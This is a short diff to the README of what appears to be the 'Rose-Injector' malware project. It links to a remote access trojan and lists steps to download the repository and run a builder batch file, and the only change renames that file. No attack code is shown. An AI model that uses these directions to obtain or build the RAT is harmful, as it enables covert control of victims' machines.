@@ -95,7 +95,7 @@ To use the rat, check [this](https://github.com/DamagingRose/Rose-RAT)
 Don't forget that the project is still under development release and might contain bugs.
 
 - [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
-- Run the `launch_builer.bat` to open up the Rose builder/Python installer.
+- Run the `builer.bat` to open up the Rose builder/Python installer.
 - Enjoy!
 
 ## <a id="preview"></a> 📷 〢 Preview
